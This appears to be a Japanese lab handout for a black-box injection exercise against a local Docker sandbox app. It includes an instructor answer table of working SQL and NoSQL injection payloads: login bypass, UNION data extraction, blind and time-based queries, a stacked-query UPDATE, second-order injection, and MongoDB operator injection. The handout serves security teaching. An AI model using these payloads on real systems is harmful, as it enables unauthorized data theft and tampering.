# PoC⑦: Black-box Injection Challenge

ここまで紹介した脆弱性を、1つのローカルアプリに混ぜた総合演習です。
受講者はコードを見ずに、ZAP・ブラウザ・curlだけで脆弱ポイントを探します。

```bash
cd sandboxes/poc_sql_injection
docker compose up --build
# http://127.0.0.1:5007
```

## 受講者向けルール

- 対象は `http://127.0.0.1:5007` だけ
- まず普通の操作をして、画面・URL・リクエスト・レスポンスを観察する
- ZAPのSpider/Active Scanを使ってよい
- コードは見ない
- 破壊系は、最初は改ざん確認に留める

## 探索の観点

- 入力欄に `'` や `"` を入れたとき、エラーや表示差分があるか
- 数値に見えるパラメータに、条件式を混ぜられないか
- 一覧・検索画面で、別テーブルの情報を混ぜられないか
- 保存した値が、別画面で再利用されていないか
- JSON APIで、文字列の代わりに条件オブジェクトを送れるか
- 応答時間の差だけで情報を推測できないか

## 講師向け答え合わせ

| 場所 | 代表的な脆弱性 | 確認例 |
|---|---|---|
| `/login` | SQLiログインバイパス | `admin' -- ` |
| `/catalog?q=` | UNION情報漏洩 | `zzz%' UNION SELECT id,email,last_order_total FROM challenge_customers -- ` |
| `/track?order_id=` | Boolean/Time-based blind SQLi | `1001 AND 1=1` / `1001 AND SLEEP(3)` |
| `/notes` | Stacked queries | `x'); UPDATE challenge_notes SET text='CHANGED' WHERE id=1; -- ` |
| `/register` → `/admin/report` | Second-order SQLi | `nobody' OR '1'='1' -- ` を登録後、レポートを開く |
| `/api/login` | NoSQL injection | `{"username":{"$ne":null},"password":{"$ne":null}}` |
| `/api/customers?filter=` | NoSQL条件注入 | `{"total":{"$gt":0}}` |

## 講義での進め方

1. 10分: 通常操作で画面とAPIを把握する
2. 10分: ZAPでSpider/Active Scanし、怪しい箇所をメモする
3. 20分: 手動ペイロードで攻撃を再現する
4. 10分: 見つけた脆弱性を種類ごとに分類する
5. 10分: 講師が答え合わせし、対策に戻す
